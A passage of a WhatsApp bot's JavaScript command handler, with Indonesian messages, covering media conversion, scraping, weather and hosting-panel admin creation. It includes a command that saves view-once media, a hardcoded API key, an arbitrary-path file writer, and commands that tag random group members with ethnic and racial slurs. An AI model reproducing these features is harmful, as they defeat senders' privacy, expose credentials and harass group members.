if (!res.success) throw new Error(`IP ${text} not found!`);
await cay.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
m.reply(formatIPInfo(res)); 
} catch (e) { 
m.reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break
case 'filmsearch': {
    if (!text) return reply('Masukan query')

    m.reply(msg.wait)
    
    async function film(query) {
    return new Promise((resolve, reject) => {
      const https = require('https')
        const url = `https://ruangmoviez.my.id/?s=${query}`
        
        https.get(url, (resp) => {
            let data = ''
            
            resp.on('data', (chunk) => {
                data += chunk
            })
            
            resp.on('end', () => {
                let $ = cheerio.load(data)
                const movies = []

                $('article.item-infinite').each((index, element) => {
                    const movie = {}
                    movie.link = $(element).find('a[itemprop="url"]').attr('href')
                    movie.title = $(element).find('h2.entry-title a').text()
                    movie.relTag = $(element).find('a[rel="category tag"]').map((i, el) => $(el).text()).get()
                    movies.push(movie)
                })

                resolve({
                    status: 200,
                    creator: author,
                    result: movies
                })
            })
        }).on("error", (err) => {
            resolve({
                status: 404,
                msg: err.message
            })
        })
    })
}
    
    let { result } = await film(text)
    let cap = `\`Search Film From: ${text}\`\n\n`
    for (let res of result) {
        cap += `*Title*: ${res.title}\n`
        cap += `*Link*: ${res.link}\n`
        cap += `*Genre*: ${res.relTag.map(v => v).join(', ')}\n\n`
    }
    m.reply(cap)
}
break
case 'tagall': {
if (!m.isGroup) return reply('khusus grup')
if (!isAdmin && !isCreator) return reply('Khusus Admin!!')
if (!isBotAdmin && !isCreator) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
me = m.sender
let teks = `╚»˙·٠● tag All ●٠·˙«╝ 
 
 😶 *tagger :*  @${me.split('@')[0]}
 🌿 *message : ${q ? q : 'no message'}*\n\n`
for (let mem of participants) {
teks += `@${mem.id.split('@')[0]}\n`
}
cay.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'readvo': case 'rvo': {
if (!isQuotedViewOnce) return reply('Reply viewonce')
let type = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[type]
let media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await cay.sendMessage(m.chat, { video: buffer, caption: quotedType.caption })
} else if (/image/.test(type)) {
await cay.sendMessage(m.chat, { image: buffer, caption: quotedType.caption })
}
}
break

case 'toimage': case 'toimg': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await cay.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
cay.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break

case 'tomp3': {
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
cay.sendMessage(from, {audio: dl, mimetype:'audio/mpeg', ptt:false, contextInfo:{ externalAdReply: { showAdAttribution: false,
mediaType: 1,
mediaUrl: 'https://youtube.com/@-',
title: `Converter mp3`,
sourceUrl: `https://whatsapp.com/channel/0029Vau1badL7UVPMi0WMk0A`,
thumbnail: ppuser
}
}})
}
break

case 'cekcuaca': case 'weather':{
//if (!isRegistered) return registerbut(noregis)
if (!text) return reply('lokasinya dimana?')
let wdata = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
);
let textw = ""
textw += `*🗺️Weather of ${text}*\n\n`
textw += `*Weather :* ${wdata.data.weather[0].main}\n`
textw += `*Description :* ${wdata.data.weather[0].description}\n`
textw += `*Avg Temp :* ${wdata.data.main.temp}\n`
textw += `*Feels Like :* ${wdata.data.main.feels_like}\n`
textw += `*Pressure :* ${wdata.data.main.pressure}\n`
textw += `*Humidity :* ${wdata.data.main.humidity}\n`
textw += `*Humidity :* ${wdata.data.wind.speed}\n`
textw += `*Latitude :* ${wdata.data.coord.lat}\n`
textw += `*Longitude :* ${wdata.data.coord.lon}\n`
textw += `*Country :* ${wdata.data.sys.country}\n`

cay.relayMessage(from, { liveLocationMessage: { 
degreesLatitude: `${wdata.data.coord.lat}`,
degreesLongitude: `${wdata.data.coord.lon}`,
name: text,
url: "https://foursquare.com/v/520dceb911d2dac1f713434a",
caption: textw,
sequenceNumber: 1709322015967001, timeOffset: Date.now(), jpegThumbnail: ppuser,
}
}, { quoted: qtext2 })
}
break
case 'gpt4': {
  if (!text) return m.reply(`Hai, apa yang ingin saya bantu?`)
async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
            "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
            "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let pei = await openai(text, "")
m.reply(pei)
}
break
case 'preman':
case 'anj':
case 'beban':
case 'tolol':
case 'goblog':
case 'goblok':
case 'idiot':
case 'gay':
case 'jomok':
case 'bajingan':
case 'munafik':
case 'kontol':
case 'yatim':
case 'poke':
case 'pembokep':
case 'hitam':
case 'hytam':
case 'dark sistem':
case 'bego':
case 'jawa':
case 'wibu':
case 'stress':
case 'miskin':
case 'cantik':
case 'manis':
case 'babi':
case 'ganteng':
case 'cina':
case 'atheis':
case 'papua':
case 'nigga':
case 'pengentot':
case 'seksi':
case 'kawai':
case 'tercindo':
case 'tampan':
case 'fembokef':
case 'pengocok':
case 'cabul':
case 'fuckboy':
case 'playboy':
case 'sange':
case 'sangean':
case 'hot': {
const participantss = m.isGroup ? await groupMetadata.participants : ''
            let member = participantss.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
cay.sendMessage(m.chat,
{ text: `orang ${command} disini adalah @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${command} yang di tag`,
"body": `${namaowner}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": ppuser,
"sourceUrl": `https://whatsapp.com/channel/0029Vau1badL7UVPMi0WMk0A`}}},
{ quoted: ftroli})        
            }
            break
/*case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ffffff"]
let reswarna = await warna[Math.floor(Math.random()*warna.length)]
m.reply(msg.wait)
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": reswarna,
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = makeid+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await cay.sendStimg(m.chat, tempnya, m, {packname: namabot})
fs.unlinkSync(`./${tempnya}`)
})
})
}
break*/
         case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ffffff"]
let reswarna = await warna[Math.floor(Math.random()*warna.length)]

const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": reswarna,
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = makeid+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await cay.sendStimg(m.chat, tempnya, m, {packname: author})
fs.unlinkSync(`./${tempnya}`)
})
})
}
break
case 'qc2': {
if (!q) return reply(`📌Example: ${prefix + command} pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`)
if (text.length > 100) return reply(`Max 100 character.`)
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'blue':
backgroundColor = '#6cace4';
break;
case 'red':
backgroundColor = '#f44336';
break;
case 'green':
backgroundColor = '#4caf50';
break;
case 'yellow':
backgroundColor = '#ffeb3b';
break;
case 'purple':
backgroundColor = '#9c27b0';
break;
case 'darkblue':
backgroundColor = '#0d47a1';
break;
case 'lightblue':
backgroundColor = '#03a9f4'; 
break;
case 'ash':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'black':
backgroundColor = '#000000';
break;
case 'white':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'lightpink':
backgroundColor = '#FFC0CB';
break;
case 'chocolate':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'fire':
backgroundColor = '#B22222';
break;
case 'skyblue':
backgroundColor = '#00BFFF';
break; 
case 'orange':
backgroundColor = '#FF7F50';
break;
case 'brightskyblue':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'lightskyblue':
backgroundColor = '#87CEEB'; 
break; 
case 'seagreen':
backgroundColor = '#20B2AA'; 
break; 
case 'darkred':
backgroundColor = '#8B0000'; 
break; 
case 'orangered':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'violet':
backgroundColor = '#BA55D3'; 
break; 
case 'mossgreen':
backgroundColor = '#00FF7F'; 
break; 
case 'darkgreen':
backgroundColor = '#008000'; 
break; 
case 'navyblue':
backgroundColor = '#191970'; 
break; 
case 'darkorange':
backgroundColor = '#FF8C00'; 
break; 
case 'darkpurple':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'darkmagenta':
backgroundColor = '#8B008B'; 
break;
case 'darkgray':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'darkishgreen':
backgroundColor = '#BDB76B'; 
break;
case 'darkishred':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'darkishgray':
backgroundColor = '#696969'; 
break;
case 'darkishpurple':
backgroundColor = '#483D8B'; 
break;
case 'gold':
backgroundColor = '#FFD700'; 
break;
case 'silver':
backgroundColor = '#C0C0C0'; 
break;
default:
return reply('The selected color is not available.')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: ppuser
}
},
text: message,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
cay.sendStimg(m.chat, buffer, { packname: `${global.packname}`, author: `${global.author}`})
}
break
case 'film': {
 const query = m.body.slice(5).trim();
 if (!query) {
 return m.reply("Silakan masukkan judul film yang ingin dicari.");
 }
// wm avz
 async function avzzzz(query) {
 try {
 const response = await axios.get(`https://tv.lk21official.my/search.php?s=${query}`);
 const html = response.data;
 const $ = cheerio.load(html);
 let results = [];
// wm avz
 $('.search-item').each((index, element) => {
 const title = $(element).find('h3 a').text().trim();
 const url = 'https://tv.lk21official.my' + $(element).find('h3 a').attr('href');
 const director = $(element).find('p strong:contains("Sutradara:")').parent().text().replace("Sutradara:", "").trim();
 const cast = $(element).find('p strong:contains("Bintang:")').parent().text().replace("Bintang:", "").trim();
// wm avz
 results.push({
 title,
 url,
 director,
 cast
 });
 });
// wm avz
 return results;
 } catch (error) {
 console.error(error);
 return [];
 }
 }
// wm avz
 const results = await avzzzz(query);
 if (results.length === 0) {
 return m.reply("Tidak ditemukan hasil untuk pencarian: " + query);
 }
// wm avz
 let message = "Hasil pencarian untuk: *" + query + "*\n\n";
 results.forEach((result) => {
 message += `Title: ${result.title}\n`;
 if (result.director) {
 message += `Sutradara: ${result.director}\n`;
 }
 if (result.cast) {
 message += `Bintang: ${result.cast}\n`;
 }
 message += `Url: ${result.url}\n\n`;
 });
// wm avz
 m.reply(message);
}
break

case 'addprem':
if (!isOwner) return m.reply(msg.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} number\nContoh ${prefix+command} 62xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await cay.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
premium.push(prrkek)
fs.writeFileSync('./all/database/premium.json', JSON.stringify(premium))
m.reply(`The Number ${prrkek} Has Been Premium!`)
break
case 'delprem':
if (!isOwner) return m.reply(msg.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} Nomor\nContoh ${prefix+command} 62xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync('./all/database/premium.json', JSON.stringify(premium))
m.reply(`The Number ${ya} Has Been Removed Premium!`)
break
/*case 'addowner':
if (!isOwner) return m.reply(msg.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} number\nContoh ${prefix+command} 62xxx`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await cay.onWhatsApp(bnnd)
if (ceknye.length == 0) return reply(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(owner))
m.reply(`Number ${bnnd} Has Become An Owner!!!`)
break*/
case 'delowner':
if (!isOwner) return m.reply(msg.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} nomor\nContoh ${prefix+command} 62xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(owner))
m.reply(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let cay of premium) {
teks += `- ${cay}\n`
}
teks += `\n*Total : ${premium.length}*`
cay.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": premium } })
break
case 'listowner': case 'listown':
teks = '*owner List*\n\n'
for (let kontol of owner) {
teks += `- ${kontol}\n`
}
teks += `\n*Total : ${owner.length}*`
cay.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": owner } })
break

case 'webtoon':{
async function webtoons(query) {
//wm senn
    return new Promise((resolve, reject) => {
        axios.get(`https://www.webtoons.com/id/search?keyword=${query}`)
//wm senn
            .then(({
                data
            }) => {
                const $ = cheerio.load(data)
                const hasil = [];
                 $('#content > div.card_wrap.search._searchResult > ul > li ').each(function(a, b) {
//wm senn
                    result = {
                    status: 200,
                    author: author,
                    judul: $(b).find('> a > div > p.subj').text(),
//wm senn
                    like: $(b).find('> a > div > p.grade_area > em').text(),
                    creator: $(b).find('> a > div > p.author').text(),
                    genre: $(b).find('> a > span').text(),
//wm senn
                    thumbnail: $(b).find('> a > img').attr('src'),
                    url: $(b).find('> a').attr('href')
                }
//wm senn
                hasil.push(result)
                })
//wm senn
                resolve(hasil)
            })
            .catch(reject)
    })
}
//wm senn
if (!text) return  m.reply('Masukan judul yang ingin dicari!!\nContoh: .webtoon lookism');
let results = await webtoons(text)
if (results.length > 0) {
//wm senn
let message = `Hasil dari pencarian ${text} :\n\n`;
results.forEach((result, index) => {
message += `Title : ${result.judul}\nLike : ${result.like}\nCreator : ${result.creator}\nGenre : ${result.genre}\nLink Baca : ${result.url}\n\n`;
 });
//wm senn
m.reply(message)
 } else {
m.reply('Tidak Ada Hasil.');
}
//wm senn
}
break

case 'addfile2': {
    if (!isOwner) return reply(msg.owner)
    if (!text.includes("./")) return m.reply(`Contoh: ${prefix + command} ./path/to/file.txt`);
    
    let filePath = path.resolve(text);
    let dir = path.dirname(filePath);
    let fileName = path.basename(filePath);
    
    if (!fs.existsSync(dir)) {
        return m.reply('Direktori tidak ditemukan!');
    }
    
    // Pastikan pesan yang dikutip berisi dokumen
    if (!m.quoted) {
        return m.reply('Tidak ada file yang dikutip!');
    }

    try {
        let media = await downloadContentFromMessage(m.quoted, "document");
        let buffer = Buffer.from([]);
        
        for await (const chunk of media) {
            buffer = Buffer.concat([buffer, chunk]); // Gunakan let agar buffer bisa diubah
        }

        if (fs.existsSync(filePath)) {
            fs.appendFileSync(filePath, buffer);
            m.reply(`Berhasil menambahkan konten ke ${fileName}`);
        } else {
            fs.writeFileSync(filePath, buffer);
            m.reply(`Berhasil membuat file ${fileName} dan menambahkan konten.`);
        }
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat mengunduh atau menyimpan file.');
    }
}
break;

case "addowner": {
if (!isOwner) return reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (newowner.includes(orang)) return m.reply(`User ${orang.split('@')[0]} Sudah Terdaftar Di Database ownerl!`)
await newowner.push(orang)
await fs.writeFileSync("./all/database/newowner.json", JSON.stringify(newowner))
m.reply(`Berhasil Menjadikan ${orang.split('@')[0]} Sebagai owner bot`)
} else {
return m.reply(example("@tag/62838XXX"))
}}
break


case "addseller": {
if (!isOwner) return reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (reseller.includes(orang)) return m.reply(`User ${orang.split('@')[0]} Sudah Terdaftar Di Database Reseller Panel!`)
await reseller.push(orang)
await fs.writeFileSync("./all/database/reseller.json", JSON.stringify(reseller))
m.reply(`Berhasil Menjadikan ${orang.split('@')[0]} Sebagai Reseller Panel`)
} else {
return m.reply(example("@tag/62838XXX"))
}}
break
case "delseller": {
if (!isOwner) return reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!reseller.includes(orang)) return m.reply(`User ${orang.split('@')[0]} Tidak Terdaftar Di Database Reseller Panel!`)
let indx = reseller.indexOf(orang)
await reseller.splice(indx, 1)
await fs.writeFileSync("./all/database/reseller.json", JSON.stringify(reseller))
m.reply(`Berhasil Menghapus ${orang.split('@')[0]} Dari Database Reseller Panel`)
} else {
return m.reply(example("@tag/62838XXX"))
}}
break
case "listseller": {
if (reseller.length < 1) return m.reply("Tidak Ada Reseller Panel")
let teksnya = ` LIST RESELLER PANEL⚡\n\n`
reseller.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
cay.sendMessage(m.chat, {text: teksnya, mentions: [...reseller]}, {quoted: qtoko})
}
break
case "addadmin": {
if (!text) return m.reply(example("username"))
if (!isOwner) return reply(msg.owner)
let username = text.toLowerCase()
let email = username+"@hutao.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply("*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `${monospace('Chat Privat data Panel')}

 ╭─ DATA ADMIN PANEL ANDA 」
 │• 🖥️ _ID_ : ${user.id}
 │• 📝 _CREATED_ : ${monospa(user.created_at.split("T")[0])}
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(password)}
 │• 🔗 _LOGIN_ : s̴e̴n̴s̴o̴r̴
 │• 💲 _${global.domain}_
 ╰────`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
/*"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`*/
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await cay.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "addadmin2": {
if (!text) return m.reply(example("nama,6283XXX"))
if (!isOwner) return reply(msg.owner)
if (!args[0]) return m.reply(example("nama,6283XXX"))
if (!text.split(",")) return m.reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return m.reply(example("nama,6283XXX"))
var ceknya1 = text.split(",")[1]
if (!ceknya1) return m.reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await cay.onWhatsApp(ceknya1)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let username = buyyer.toLowerCase()
let email = username+"@hutao.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
await m.reply(`*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${ceknya}`)
var teks = `${monospace('Chat Privat data Panel')}

 ╭─ DATA ADMIN PANEL ANDA 」
 │• 🖥️ _ID_ : ${user.id}
 │• 📝 _CREATED_ : ${monospa(user.created_at.split("T")[0])}
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(password)}
 │• 🔗 _LOGIN_ : s̴e̴n̴s̴o̴r̴
 │• 💲 _${global.domain}_
 ╰────`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
/*"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`*/
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await cay.relayMessage(client, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "deladmin": {
if (!isOwner) return reply(msg.owner)
if (!args[0]) return m.reply(example("id\n\nuntuk melihat id admin ketik *.listadmin*"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("ID Admin Tidak Ditemukan!")
m.reply(`Berhasil Menghapus Admin Panel *${capital(getid)}*`)
}
break
//=================================================//
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':{
if (!qmsg) return reply("reply audio nya")
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await cay.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
cay.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
} catch (e) {
console.log(e)
reply('error')
}}
break
case "listadmin": {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let totaladmin = 0
if (users.length < 1 ) return m.reply("Tidak Ada Admin Panel")
var teks = " *LIST ADMIN PANEL BOT⚡*\n\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
totaladmin += 1
teks += `\`📡ID User ${i.attributes.id}\`
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n\n`
})
teks += ` Total Admin : *${totaladmin} Admin*`
cay.sendMessage(m.chat, teks, qtoko)
}
break

case 'cpanel': case 'addpanel':{
//if (!isRegistered) return registerbut(noregis)
